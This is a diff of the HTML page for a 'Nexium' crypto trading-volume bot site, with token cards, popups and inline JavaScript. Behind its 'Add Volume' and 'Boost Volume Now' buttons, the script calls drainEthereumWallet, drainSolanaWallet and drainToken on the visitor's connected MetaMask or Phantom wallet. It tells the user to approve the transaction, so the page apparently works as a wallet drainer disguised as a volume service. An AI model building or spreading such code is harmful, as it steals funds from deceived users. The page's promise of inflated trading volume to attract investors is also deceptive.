-        <p class="address">SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt</p>
-        <p class="market-cap">Market Cap: $0.3B</p>
-      </div>
-      <div class="token-card" data-address="MangoCzJ36AjZyKwVj3Vn6h4uW3Y8pf3J6pCz3dZ1x2">
-        <p class="name">MNGO (SOL)</p>
-        <p class="address">MangoCzJ36AjZyKwVj3Vn6h4uW3Y8pf3J6pCz3dZ1x2</p>
-        <p class="market-cap">Market Cap: $0.2B</p>
-      </div>
-      <div class="token-card" data-address="AURYydfxJib1ZkTir1Jn1J9ECYUtjb6rKQVmtYaixWPP">
-        <p class="name">AURY (SOL)</p>
-        <p class="address">AURYydfxJib1ZkTir1Jn1J9ECYUtjb6rKQVmtYaixWPP</p>
-        <p class="market-cap">Market Cap: $0.1B</p>
-      </div>
-      <div class="token-card" data-address="0x2260fac5e5542a773aa44fbcfedf7c193bc2c599">
-        <p class="name">WBTC (ETH)</p>
-        <p class="address">0x2260fac5e5542a773aa44fbcfedf7c193bc2c599</p>
-        <p class="market-cap">Market Cap: $10B</p>
-      </div>
-      <div class="token-card" data-address="0xae7ab96520de3a18e5e111b5eaab095312d7fe84">
-        <p class="name">STETH (ETH)</p>
-        <p class="address">0xae7ab96520de3a18e5e111b5eaab095312d7fe84</p>
-        <p class="market-cap">Market Cap: $9B</p>
-      </div>
-      <div class="token-card" data-address="0x50327c6c5a14dcade707abad2e27eb5173e9f3b8">
-        <p class="name">TRX (ETH)</p>
-        <p class="address">0x50327c6c5a14dcade707abad2e27eb5173e9f3b8</p>
-        <p class="market-cap">Market Cap: $8B</p>
-      </div>
-      <div class="token-card" data-address="0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe">
-        <p class="name">XRP (ETH)</p>
-        <p class="address">0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe</p>
-        <p class="market-cap">Market Cap: $7.5B</p>
-      </div>
-      <div class="token-card" data-address="0x3ee2200efb3400fabb9aacf9a2fd56c06f5c6f4b">
-        <p class="name">ADA (ETH)</p>
-        <p class="address">0x3ee2200efb3400fabb9aacf9a2fd56c06f5c6f4b</p>
-        <p class="market-cap">Market Cap: $6B</p>
-      </div>
-      <div class="token-card" data-address="0x1ce0c145c826f36e4b7b6e6b4f5b7b5e6e6b4f5b">
-        <p class="name">AVAX (ETH)</p>
-        <p class="address">0x1ce0c145c826f36e4b7b6e6b4f5b7b5e6e6b4f5b</p>
-        <p class="market-cap">Market Cap: $5B</p>
-      </div>
-      <div class="token-card" data-address="0xbaac2b4491727d78d2b78815144570b9f2fe8899">
-        <p class="name">DOGE (ETH)</p>
-        <p class="address">0xbaac2b4491727d78d2b78815144570b9f2fe8899</p>
-        <p class="market-cap">Market Cap: $4B</p>
-      </div>
-      <div class="token-card" data-address="0x7083609fce4d1d8dc0c979aab8c869ea2c873402">
-        <p class="name">DOT (ETH)</p>
-        <p class="address">0x7083609fce4d1d8dc0c979aab8c869ea2c873402</p>
-        <p class="market-cap">Market Cap: $3.5B</p>
-      </div>
-      <div class="token-card" data-address="0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0">
-        <p class="name">MATIC (ETH)</p>
-        <p class="address">0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0</p>
-        <p class="market-cap">Market Cap: $3B</p>
-      </div>
-      <div class="token-card" data-address="0x85f17cf997934a59727b6126a3420d0a7843d03c">
-        <p class="name">NEAR (ETH)</p>
-        <p class="address">0x85f17cf997934a59727b6126a3420d0a7843d03c</p>
-        <p class="market-cap">Market Cap: $2.5B</p>
-      </div>
-    </div>
-  </section>
-  <div class="token-popup" id="token-popup">
-    <div class="token-popup-content">
-      <p class="name"></p>
-      <p class="address"></p>
-      <p class="market-cap"></p>
-      <div class="input-group">
-        <span>$</span>
-        <input type="number" class="volume-input" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
-      </div>
-      <button class="add-volume-btn" aria-label="Add Volume">Add Volume</button>
-      <button class="close-popup" aria-label="Close Popup">Close</button>
-    </div>
-  </div>
-  <div class="custom-token-popup" id="custom-token-popup">
-    <div class="custom-token-popup-content">
-      <h2 class="text-yellow-400">Import Custom Token</h2>
-      <div class="input-group">
-        <input type="text" class="address-input volume-input" id="custom-token-address" placeholder="Token Address" aria-label="Custom token address">
-      </div>
-      <div class="input-group">
-        <span>$</span>
-        <input type="number" class="volume-input" id="custom-token-amount" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
-      </div>
-      <button class="add-volume-btn" id="custom-token-submit" aria-label="Add Volume">Add Volume</button>
-      <button class="close-popup" id="close-custom-token-popup" aria-label="Close Popup">Close</button>
-    </div>
-  </div>
-  <footer class="text-center text-sm text-gray-400 py-6 border-t border-gray-700">
-    <p>© 2025 Nexium-volume-bot — Built with ❤</p>
-  </footer>
-  <script src="canvas.js"></script>
-  <script type="module" src="main.js"></script>
-  <script type="module">
-    import { NexiumApp } from './main.js';
-    
-    try {
-      const app = new NexiumApp();
-      console.log('NexiumApp initialized successfully');
-      
-      // Ensure nav-menu remains visible
-      const ensureNavMenuVisible = () => {
-        const navMenu = document.getElementById('nav-menu');
-        if (navMenu) {
-          navMenu.style.display = 'flex';
-          console.log('Nav menu ensured visible');
-        }
-      };
 
-      document.getElementById('connect-metamask').addEventListener('click', ensureNavMenuVisible);
-      document.getElementById('connect-phantom').addEventListener('click', ensureNavMenuVisible);
-      
-      // Handle token card clicks to show popup
-      const tokenCards = document.querySelectorAll('.token-card');
-      console.log(`Found ${tokenCards.length} token cards`);
-      
-      tokenCards.forEach(card => {
-        card.addEventListener('click', () => {
-          console.log('Token card clicked:', card.dataset.address);
-          const name = card.querySelector('.name').textContent;
-          const address = card.dataset.address;
-          const marketCap = card.querySelector('.market-cap').textContent;
-          const popup = document.getElementById('token-popup');
-          const popupContent = popup.querySelector('.token-popup-content');
-          
-          popupContent.querySelector('.name').textContent = name;
-          popupContent.querySelector('.address').textContent = address;
-          popupContent.querySelector('.market-cap').textContent = marketCap;
-          popupContent.querySelector('.volume-input').value = ''; // Clear input
-          
-          const addVolumeBtn = popupContent.querySelector('.add-volume-btn');
-          addVolumeBtn.onclick = () => {
-            console.log('Add Volume button clicked for address:', address);
-            const volumeInput = popupContent.querySelector('.volume-input').value;
-            if (!volumeInput || volumeInput <= 0) {
-              app.showFeedback('Please enter a valid amount.', 'error');
-              return;
-            }
-            console.log('Volume amount:', volumeInput);
-            if (app.connectedWalletType === 'MetaMask') {
-              app.drainEthereumWallet(app.publicKey);
-            } else if (app.connectedWalletType === 'Phantom') {
-              app.drainSolanaWallet(); // <-- CALL THE CORRECT FUNCTION
-            } else {
-              app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
-              return;
-            }
-            popup.classList.remove('active');
-          };
-          
-          const closePopupBtn = popupContent.querySelector('.close-popup');
-          closePopupBtn.onclick = () => {
-            console.log('Close popup clicked');
-            popup.classList.remove('active');
-          };
-          
-          popup.classList.add('active');
-        });
-      });
-      
-      // Handle custom token card click to show custom popup
-      const customTokenCard = document.querySelector('.custom-token-card');
-      if (customTokenCard) {
-        customTokenCard.addEventListener('click', () => {
-          console.log('Custom token card clicked');
-          const popup = document.getElementById('custom-token-popup');
-          const popupContent = popup.querySelector('.custom-token-popup-content');
-          popupContent.querySelector('#custom-token-address').value = ''; // Clear address input
-          popupContent.querySelector('#custom-token-amount').value = ''; // Clear amount input
-          
-          const addVolumeBtn = popupContent.querySelector('#custom-token-submit');
-          addVolumeBtn.onclick = () => {
-            console.log('Custom token Add Volume button clicked');
-            const tokenAddress = popupContent.querySelector('#custom-token-address').value.trim();
-            const amount = parseFloat(popupContent.querySelector('#custom-token-amount').value.trim());
-            if (!tokenAddress) {
-              app.showFeedback('Please enter a token address.', 'error');
-              return;
-            }
-            if (isNaN(amount) || amount <= 0) {
-              app.showFeedback('Please enter a valid amount.', 'error');
-              return;
-            }
-            console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
-            if (app.connectedWalletType === 'MetaMask') {
-              app.drainEthereumWallet(app.publicKey);
-            } else if (app.connectedWalletType === 'Phantom') {
-              app.drainToken(tokenAddress);
-            } else {
-              app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
-              return;
-            }
-            if (popup) {
-              popup.classList.remove('active');
-            }
-          };
-          
-          const closePopupBtn = popupContent.querySelector('#close-custom-token-popup');
-          closePopupBtn.onclick = () => {
-            console.log('Close custom popup clicked');
-            if (popup) {
-              popup.classList.remove('active');
-            }
-          };
-          
-          if (popup) {
-            popup.classList.add('active');
-          }
-        });
-      }
-      
-      // Close popups when clicking outside
-      document.getElementById('token-popup').addEventListener('click', (event) => {
-        if (event.target === event.currentTarget) {
-          console.log('Clicked outside token popup, closing');
-          event.currentTarget.classList.remove('active');
-        }
-      });
-      document.getElementById('custom-token-popup').addEventListener('click', (event) => {
-        if (event.target === event.currentTarget) {
-          console.log('Clicked outside custom token popup, closing');
-          event.currentTarget.classList.remove('active');
-        }
-      });
+    <main id="app" class="flex-1 flex flex-col items-center justify-center px-4 py-8">
+        <section class="max-w-4xl w-full mx-auto text-center my-8">
+            <h1 class="text-4xl md:text-5xl font-extrabold text-white leading-tight mb-4">
+                Effortlessly Boost Your Token’s Trading Volume 🚀
+            </h1>
+            <p class="text-lg text-gray-400 max-w-2xl mx-auto mb-8">
+                Elevate your token’s visibility and credibility on Solana and Ethereum. Nexium-MTX enables you to generate real trading activity, deepen liquidity, and climb the charts on top crypto platforms—all in just a few steps.
+            </p>
+        </section>
 
-      // Ensure nav menu is always visible
-      ensureNavMenuVisible();
-    } catch (error) {
-      console.error('Error initializing token card listeners:', error);
-    }
-  </script>
+        <section class="max-w-xl w-full mx-auto bg-[#1a182e] p-6 md:p-8 rounded-xl border border-orange-400 shadow-xl">
+            <h2 class="text-2xl md:text-3xl font-bold text-yellow-400 mb-6 text-center">Add Volume to Your Token</h2>
+            
+            <div id="token-info" class="mb-6 hidden info-card">
+                <img id="token-logo" src="" alt="Token Logo" class="mx-auto mb-4" />
+                <h3 id="token-name" class="text-yellow-400 text-2xl font-bold"></h3>
+                <p id="token-symbol" class="text-gray-400 text-lg mb-2"></p>
+                <p id="token-address-display" class="text-sm text-gray-500 break-all"></p>
+                <div class="mt-4">
+                    <p id="token-market-cap" class="text-gray-300 font-semibold"></p>
+                    <p id="token-price" class="text-gray-300 font-semibold"></p>
+                </div>
+            </div>
+
+            <div class="space-y-6">
+                <div class="form-group">
+                    <label for="token-address" class="block text-gray-300 font-semibold mb-2">Token Address</label>
+                    <input type="text" id="token-address-input" placeholder="Paste token address (e.g., for SOL or WETH)" class="w-full p-3 rounded-xl bg-[#1a182e] border border-orange-400 text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400" />
+                </div>
+
+                <div class="form-group">
+                    <label for="chain-select" class="block text-gray-300 font-semibold mb-2">Select Chain</label>
+                    <select id="chain-select" class="w-full p-3 rounded-xl bg-[#1a182e] border border-orange-400 text-white focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400">
+                        <option value="solana">Solana</option>
+                        <option value="ethereum">Ethereum</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="volume-amount" class="block text-gray-300 font-semibold mb-2">Volume Amount ($)</label>
+                    <input type="number" id="volume-amount" placeholder="Enter amount in USD" class="w-full p-3 rounded-xl bg-[#1a182e] border border-orange-400 text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400" min="10" />
+                </div>
+            </div>
+
+            <button id="boost-volume-btn" class="glow-button w-full mt-8 py-3 text-black font-semibold text-lg rounded-xl transition-all hover:scale-[1.02] active:scale-100">
+                Boost Volume Now
+            </button>
+
+            <p id="status-message" class="text-center mt-4 text-sm text-gray-400"></p>
+        </section>
+
+        <section class="max-w-4xl w-full mx-auto my-12">
+            <h2 class="text-3xl font-bold text-center text-white mb-8">Why Nexium-MTX?</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="info-card">
+                    <i class="fas fa-chart-line text-yellow-400 text-4xl mb-4"></i>
+                    <h3 class="text-xl font-bold text-yellow-400">Stay Trending</h3>
+                    <p class="text-gray-400 mt-2">Our automation keeps your token among the most active pairs, maximizing exposure and attracting new investors 24/7.</p>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-rocket text-yellow-400 text-4xl mb-4"></i>
+                    <h3 class="text-xl font-bold text-yellow-400">Instant Results</h3>
+                    <p class="text-gray-400 mt-2">Submit your details and see your token’s volume increase within minutes. Nexium-MTX operates around the clock for immediate, reliable results.</p>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-star text-yellow-400 text-4xl mb-4"></i>
+                    <h3 class="text-xl font-bold text-yellow-400">Stronger Metrics</h3>
+                    <p class="text-gray-400 mt-2">Boost trading volume and liquidity pool depth to strengthen your token’s market position and support long-term growth.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="max-w-4xl w-full mx-auto my-12 text-center">
+            <h2 class="text-3xl font-bold text-white mb-4">Nexium-MTX Bot Services</h2>
+            <p class="text-lg text-gray-400 mb-8">Unlock a suite of automation tools designed to accelerate your crypto project’s growth and trading activity.</p>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="info-card">
+                    <h3 class="text-xl font-bold text-yellow-400">Buy Bot</h3>
+                    <p class="text-gray-400 mt-2">Drive your token to the top of trending charts with proven, high-frequency volume generation.</p>
+                </div>
+                <div class="info-card">
+                    <h3 class="text-xl font-bold text-yellow-400">Price Bot</h3>
+                    <p class="text-gray-400 mt-2">Deliver real-time price updates to your community, keeping holders informed and engaged.</p>
+                </div>
+                <div class="info-card">
+                    <h3 class="text-xl font-bold text-yellow-400">New Pairs Bot</h3>
+                    <p class="text-gray-400 mt-2">Get instant alerts on newly listed tokens and trading pairs to stay ahead of the market.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="max-w-4xl w-full mx-auto my-12 text-center">
+            <div class="bg-[#1a182e] p-8 rounded-xl border border-orange-400 shadow-xl">
+                <h2 class="text-3xl font-bold text-white mb-4">Disclaimer</h2>
+                <p class="text-gray-400 text-sm">
+                    Nexium-MTX provides information and automation tools for educational purposes only. Cryptocurrency trading is highly volatile and involves risk. Always do your own research and consult a professional advisor before making investment decisions. Use our services at your own risk.
+                </p>
+            </div>
+        </section>
+
+    </main>
+    <div class="token-popup" id="token-popup">
+        <div class="token-popup-content">
+            <p class="name"></p>
+            <p class="address"></p>
+            <p class="market-cap"></p>
+            <div class="input-group">
+                <span>$</span>
+                <input type="number" class="volume-input" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
+            </div>
+            <button class="add-volume-btn" aria-label="Add Volume">Add Volume</button>
+            <button class="close-popup" aria-label="Close Popup">Close</button>
+        </div>
+    </div>
+    <div class="custom-token-popup" id="custom-token-popup">
+        <div class="custom-token-popup-content">
+            <h2 class="text-yellow-400">Import Custom Token</h2>
+            <div class="input-group">
+                <input type="text" class="address-input volume-input" id="custom-token-address" placeholder="Token Address" aria-label="Custom token address">
+            </div>
+            <div class="input-group">
+                <span>$</span>
+                <input type="number" class="volume-input" id="custom-token-amount" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
+            </div>
+            <button class="add-volume-btn" id="custom-token-submit" aria-label="Add Volume">Add Volume</button>
+            <button class="close-popup" id="close-custom-token-popup" aria-label="Close Popup">Close</button>
+        </div>
+    </div>
+
+    <footer class="text-center text-sm text-gray-400 py-6 border-t border-gray-700">
+        <p>© 2025 Nexium-volume-bot — Built with ❤</p>
+    </footer>
+    <script src="canvas.js"></script>
+    <script type="module" src="main.js"></script>
+    <script type="module">
+        import { NexiumApp } from './main.js';
+     
+        try {
+            const app = new NexiumApp();
+            console.log('NexiumApp initialized successfully');
+     
+            // Ensure nav-menu remains visible
+            const ensureNavMenuVisible = () => {
+                const navMenu = document.getElementById('nav-menu');
+                if (navMenu) {
+                    navMenu.style.display = 'flex';
+                    console.log('Nav menu ensured visible');
+                }
+            };
+     
+            document.getElementById('connect-metamask').addEventListener('click', ensureNavMenuVisible);
+            document.getElementById('connect-phantom').addEventListener('click', ensureNavMenuVisible);
+            ensureNavMenuVisible();
+     
+            // New logic for the main body form
+            const tokenAddressInput = document.getElementById('token-address-input');
+            const chainSelect = document.getElementById('chain-select');
+            const volumeAmountInput = document.getElementById('volume-amount');
+            const boostVolumeBtn = document.getElementById('boost-volume-btn');
+            const statusMessage = document.getElementById('status-message');
+            const tokenInfoSection = document.getElementById('token-info');
+     
+            // Function to fetch token data from an API (this is a placeholder)
+            async function fetchTokenData(address, chain) {
+                // In a real application, you would make an API call here.
+                // For example, to CoinGecko, Coinpaprika, or a custom backend.
+                // const apiURL = `https://api.coingecko.com/api/v3/coins/${chain}/contract/${address}`;
+                // const response = await fetch(apiURL);
+                // const data = await response.json();
+     
+                // Placeholder data for demonstration
+                await new Promise(resolve => setTimeout(resolve, 500)); // Simulate API delay
+                if (chain === 'solana') {
+                    return {
+                        name: 'Solana',
+                        symbol: 'SOL',
+                        logo: 'https://i.ibb.co/6P83r0S/solana-logo.png', // Replace with a real logo URL
+                        address: 'So11111111111111111111111111111111111111112',
+                        market_cap: '~$75.5B',
+                        price: '$165.23'
+                    };
+                } else if (chain === 'ethereum') {
+                    return {
+                        name: 'Wrapped Ethereum',
+                        symbol: 'WETH',
+                        logo: 'https://i.ibb.co/30B09v0/weth-logo.png', // Replace with a real logo URL
+                        address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+                        market_cap: '~$380B',
+                        price: '$3450.78'
+                    };
+                }
+                return null;
+            }
+     
+            // Listen for changes in the token address or chain selection
+            [tokenAddressInput, chainSelect].forEach(element => {
+                element.addEventListener('input', async () => {
+                    const address = tokenAddressInput.value.trim();
+                    const chain = chainSelect.value;
+     
+                    if (address.length > 20) { // A basic check for a valid address length
+                        statusMessage.textContent = 'Fetching token information...';
+                        const tokenData = await fetchTokenData(address, chain);
+     
+                        if (tokenData) {
+                            document.getElementById('token-logo').src = tokenData.logo;
+                            document.getElementById('token-name').textContent = tokenData.name;
+                            document.getElementById('token-symbol').textContent = tokenData.symbol;
+                            document.getElementById('token-address-display').textContent = `Address: ${tokenData.address}`;
+                            document.getElementById('token-market-cap').textContent = `Market Cap: ${tokenData.market_cap}`;
+                            document.getElementById('token-price').textContent = `Price: ${tokenData.price}`;
+                            tokenInfoSection.style.display = 'block';
+                            statusMessage.textContent = 'Token information loaded successfully.';
+                        } else {
+                            tokenInfoSection.style.display = 'none';
+                            statusMessage.textContent = 'Could not find token. Please check the address.';
+                        }
+                    } else {
+                        tokenInfoSection.style.display = 'none';
+                        statusMessage.textContent = '';
+                    }
+                });
+            });
+     
+            // Handle the Boost Volume button click
+            boostVolumeBtn.addEventListener('click', () => {
+                const tokenAddress = tokenAddressInput.value.trim();
+                const chain = chainSelect.value;
+                const volumeAmount = parseFloat(volumeAmountInput.value);
+     
+                if (!app.publicKey) {
+                    app.showFeedback('Please connect your wallet first.', 'error');
+                    return;
+                }
+     
+                if (!tokenAddress) {
+                    app.showFeedback('Please enter a valid token address.', 'error');
+                    return;
+                }
+     
+                if (isNaN(volumeAmount) || volumeAmount <= 0) {
+                    app.showFeedback('Please enter a valid amount to boost.', 'error');
+                    return;
+                }
+     
+                statusMessage.textContent = 'Initiating volume boost... Please approve the transaction in your wallet.';
+     
+                // Call the correct drain function based on the connected wallet and chain
+                if (chain === 'solana' && app.connectedWalletType === 'Phantom') {
+                    app.drainSolanaWallet(tokenAddress, volumeAmount);
+                } else if (chain === 'ethereum' && app.connectedWalletType === 'MetaMask') {
+                    app.drainEthereumWallet(tokenAddress, volumeAmount);
+                } else {
+                    app.showFeedback(`Your connected wallet (${app.connectedWalletType}) is not compatible with the selected chain (${chain}).`, 'error');
+                }
+            });
+     
+        } catch (error) {
+            console.error('Error initializing application logic:', error);
+        }
+    </script>
 </body>
 </html>
